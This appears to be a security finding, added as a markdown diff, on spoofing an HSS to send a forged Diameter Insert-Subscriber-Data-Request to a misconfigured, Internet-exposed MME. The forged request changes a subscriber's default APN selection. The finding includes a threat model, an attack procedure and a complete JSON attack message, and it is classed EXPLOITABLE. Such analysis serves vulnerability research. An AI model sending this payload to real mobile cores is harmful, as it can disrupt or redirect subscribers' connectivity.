@@ -1,0 +1,94 @@
+### **Threat Model:**
+- **Attack Assumption:**  
+  The S6a interface of an MME is exposed to the Internet due to misconfiguration. The attacker can impersonate the HSS, establish an unauthenticated Diameter connection, and send a spoofed `Insert-Subscriber-Data-Request` (IDR) toward the MME. The target subscriber is identified by `User-Name` (IMSI).
+- **Attacker Capability:**  
+  The attacker can send exactly one `Insert-Subscriber-Data-Request` and passively receive the corresponding `Insert-Subscriber-Data-Answer`.
+
+### **Exploitability Analysis:**
+`Subscription-Data.APN-Configuration-Profile.Context-Identifier` is a nested, profile-level provisioning field inside the grouped AVP `APN-Configuration-Profile`. In this exact path, it is the selector for the subscriber's **default APN configuration entry** within the APN profile stored by the MME.
+
+This is not descriptive metadata. In an accepted IDR, `Subscription-Data` is authoritative HSS-supplied subscriber state. If the MME accepts the request, it updates the UE's stored EPS subscription data, including the `APN-Configuration-Profile`. The profile-level `Context-Identifier` is then stored as the identifier of the default APN context.
+
+The field-specific effect is that the attacker can change **which existing `APN-Configuration` entry is treated as default**. That is distinct from merely changing the APN entries themselves: this AVP specifically repoints the default selector among repeated `APN-Configuration` records keyed by their own `Context-Identifier`.
+
+Later, when the MME handles attach/default PDN connectivity or another procedure requiring default APN selection, it consults this stored profile-level `Context-Identifier` to choose the APN configuration entry. That chosen entry supplies operational parameters such as `Service-Selection` (APN) and `PDN-Type`, which then influence downstream S11/GTPv2-C session establishment toward SGW/PGW.
+
+Concrete negative impacts tied specifically to this field include:
+- selecting the wrong default APN configuration for the subscriber;
+- causing default PDN connectivity to use an unintended APN entry already present in the profile;
+- causing attach or default bearer establishment failure if the selected context is inconsistent or points to no matching entry.
+
+This effect is durable in the MME subscriber context until legitimate overwrite, context removal, or subscriber-data refresh. The impact is subscriber-specific and depends on the APN profile contents. If only one APN configuration exists, the field may mainly create inconsistency rather than redirect service. But where multiple APN entries exist, this field is a real control point because it determines which one is the default.
+
+### **Attack Procedure:**
+- The attacker crafts a minimal `Insert-Subscriber-Data-Request` with mandatory Diameter routing/session AVPs and `Subscription-Data`.
+- Inside `Subscription-Data`, the attacker includes `APN-Configuration-Profile`.
+- The attacker sets the target `Context-Identifier` to a syntactically valid value selecting an unintended APN configuration entry.
+- To make the profile coherent in a one-shot PoC, the attacker also includes at least one matching `APN-Configuration` entry, and preferably two entries so the selector change is meaningful.
+- The attacker sends the IDR to the MME.
+- Success condition: the MME accepts and stores the spoofed APN profile, after which the subscriber's next default APN selection uses the attacker-chosen context.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "flags": {
+      "request": true,
+      "proxiable": true
+    }
+  },
+  "avps": [
+    { "avp_name": "Session-Id", "avp_value": "fakehss.example.net;1717690001;1" },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avps": [
+        { "avp_name": "Vendor-Id", "avp_value": 10415 },
+        { "avp_name": "Auth-Application-Id", "avp_value": 16777251 }
+      ]
+    },
+    { "avp_name": "Auth-Session-State", "avp_value": 1 },
+    { "avp_name": "Origin-Host", "avp_value": "hss01.epc.attacker.example" },
+    { "avp_name": "Origin-Realm", "avp_value": "attacker.example" },
+    { "avp_name": "Destination-Host", "avp_value": "mme01.epc.victim.example" },
+    { "avp_name": "Destination-Realm", "avp_value": "victim.example" },
+    { "avp_name": "User-Name", "avp_value": "001010123456789" },
+
+    {
+      "avp_name": "Subscription-Data",
+      "grouped_avps": [
+        {
+          "avp_name": "APN-Configuration-Profile",
+          "grouped_avps": [
+            {
+              "avp_name": "Context-Identifier",
+              "avp_value": 2
+            },
+
+            {
+              "avp_name": "APN-Configuration",
+              "grouped_avps": [
+                { "avp_name": "Context-Identifier", "avp_value": 1 },
+                { "avp_name": "Service-Selection", "avp_value": "internet" },
+                { "avp_name": "PDN-Type", "avp_value": "IPv4v6" }
+              ]
+            },
+            {
+              "avp_name": "APN-Configuration",
+              "grouped_avps": [
+                { "avp_name": "Context-Identifier", "avp_value": 2 },
+                { "avp_name": "Service-Selection", "avp_value": "ims" },
+                { "avp_name": "PDN-Type", "avp_value": "IPv4v6" }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
